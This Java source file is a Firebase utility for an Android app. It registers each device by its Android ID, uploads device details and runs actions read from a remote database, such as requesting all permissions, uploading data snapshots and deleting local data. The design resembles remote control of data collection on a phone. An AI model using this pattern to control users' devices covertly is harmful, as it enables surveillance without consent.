package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.getDeviceDetails;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.JsonObject;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;

import org.json.JSONObject;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class FirebaseUtils {

    // Get a reference to the database
    public static FirebaseDatabase getDatabase() {
        FirebaseDatabase database = FirebaseDatabase.getInstance(
                AppConstants.FIREBASE_DATABASE_REGION_URL);
       // database.setPersistenceEnabled(true);
        return database;
    }

    public static DatabaseReference getDbRef(String path) {
        DatabaseReference reference = getDatabase().getReference(path);
        reference.keepSynced(true);
        //reference.onDisconnect().setValue("I disconnected!");
        return reference;
    }

    private static String getPath(Context context, String path) {
        return getBasePath(context) + path;
    }

    private static String getBasePath(Context context) {
        return AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context);
    }

    public static void getAppTriggerSettingsData(Context context) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath(context, "/appSettings/appTriggerSettingsDataMap"));
        appTriggerSettingDataRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (!dataSnapshot.exists()) {
                    // User does not exist, create a new user
                    appTriggerSettingDataRef.setValue(createAppTriggerSettingsDataMap(context));
                } else {
                    ActionUtils.performFirebaseAction(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    private static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap(Context context) {
        Map<String, User.AppTriggerSettingsData> map = new HashMap<>();
        Arrays.stream(ClickActions.values()).forEach(clickAction -> {
            User.AppTriggerSettingsData obj = User.AppTriggerSettingsData.builder()
                    .enabled(false)
                    .repeatable(false)
                    .maxRepetitions(1)
                    .interval(0)
                    .actionStatus(ActionStatus.IDLE)
                    .clickActions(clickAction)
                    .uploadDataSnapshot(true)
                    .deleteLocalData(false)
                    .build();
            map.put(clickAction.name(), obj);
        });
        return map;
    }

    public static void checkAndCreateUser(Context context) {
        DatabaseReference userRef = getDbRef(getBasePath(context));
        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (!dataSnapshot.exists()) {
                    // User does not exist, create a new user
                    userRef.setValue(getUserData(context));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    private static User getUserData(Context context) {
        return User.builder()
                .fullName("Vikas Simulator")
                .userDetails(Map.of())
                .deviceDetails(getDeviceDetails(context))
                .appSettings(
                        User.AppSettings.builder()
                                .appTriggerSettingsDataMap(
                                        Map.of("", User.AppTriggerSettingsData.builder()
                                                .enabled(true)
                                                .clickActions(ClickActions.REQUEST_ALL_PERMISSION)
                                                .build())
                                )
                                .appSettingsMap(Map.of())
                                .build()
                )
                .userSettings(Map.of())
                .build();
    }

}
